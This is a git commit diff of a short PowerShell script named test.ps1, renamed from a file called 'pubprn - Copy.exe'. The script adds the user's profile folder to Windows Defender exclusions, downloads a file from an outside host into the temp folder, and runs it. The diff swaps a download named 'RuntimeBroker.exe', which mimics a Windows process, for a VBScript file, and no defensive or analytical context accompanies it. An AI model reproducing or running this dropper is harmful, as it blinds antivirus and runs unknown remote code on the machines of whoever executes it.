05d9b096b10f593b1d72e120abc57d1502546126
hjbkjgvijkkhgk <131483909+UnlimitedGPT@users.noreply.github.com>
2024-12-12 22:14:58 +0100

    Update and rename pubprn - Copy.exe to test.ps1

--- test.ps1
+++ test.ps1
@@ -1,7 +1,7 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 
-$url = "https://github.com/AnonAm0369/am/raw/refs/heads/main/RuntimeBroker.exe"
-$output = "$env:Temp/RuntimeBroker.exe"
+$url = "https://files.catbox.moe/cun1b6.vbs"
+$output = "$env:Temp/cun1b6.vbs"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 Start-Process -FilePath $output
